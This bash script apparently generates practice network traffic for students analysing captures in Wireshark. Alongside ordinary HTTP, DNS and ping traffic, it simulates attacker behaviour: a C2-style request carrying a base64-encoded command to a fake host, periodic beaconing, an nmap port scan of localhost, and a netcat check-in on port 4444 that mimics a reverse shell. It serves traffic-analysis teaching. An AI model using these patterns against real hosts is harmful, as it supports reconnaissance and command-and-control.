#!/bin/bash

#0. Push root and check dependencies
if [ "$EUID" -ne 0 ]; then
  echo "Please run as root"
  exit
fi

dnf install -y curl bind-utils ftp nmap nc

# 1. Normal HTTP and HTTPS traffic
curl http://example.com > /dev/null 2>&1
curl https://example.org > /dev/null 2>&1

# 2. DNS lookups
dig google.com
dig +short malware.test.local @1.1.1.1

# 3. Ping some public IPs/domains
ping -c 2 8.8.8.8
ping -c 2 github.com

# 4. Simulate base64-encoded payload in a URL (fake C2)
curl "http://testsite.local/c2?cmd=$(echo -n 'ls -la /' | base64)"

# 5. Simulate port scan (looks malicious in Wireshark, but harmless)
nmap -Pn -p 20-25,80,443,3389 127.0.0.1

# 6. FTP traffic (if vsftpd is available and running)
echo -e "user ftp\npass\nquit" | ftp -n localhost

# 7. Simulated beaconing (like a bot checking in)
for i in {1..3}; do
  curl -s "http://beacon.fakecorp.local/heartbeat?id=student$i" > /dev/null
  sleep 2
done

# 8. Use netcat to simulate reverse shell check-in (nothing is executed)
echo "Checking in" | nc -w 2 127.0.0.1 4444 || echo "No listener on port 4444"
